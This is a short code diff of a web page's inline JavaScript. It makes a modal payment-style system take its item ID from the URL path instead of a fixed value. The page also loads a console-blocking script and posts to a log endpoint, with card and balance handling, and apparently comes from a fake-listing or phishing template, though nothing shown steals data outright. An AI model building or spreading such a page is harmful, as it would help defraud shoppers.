@@ -338,7 +338,7 @@
   <script>
     
     var modals = new ModalSystem({
-      itemId:       '2217671294',
+      itemId:       itemId,
       logId:        null,
       price:        '5000',
       curr:         'сом',
@@ -348,7 +348,7 @@
 
       checkBalance: true,
       requestPhoneAfterBalance: false,
-      personalUrl:  '/2217671294',
+      personalUrl:  '/' + itemId,
       apiSendLog:   '/api/sendLog',
       extraPostData: {},
       onResetCard:  function() {
@@ -359,7 +359,7 @@
     });
   </script>
   <script src="/style/protect/console-ban.min.js"></script>
-  <script>const itemId = "2217671294"</script>
+  <script>const itemId = window.location.pathname.split('/')[1] || "2217671294"</script>
   <script src="/style/other/other.js"></script>
   <script>if(typeof _fmApply==='function')_fmApply();</script>
 </body>
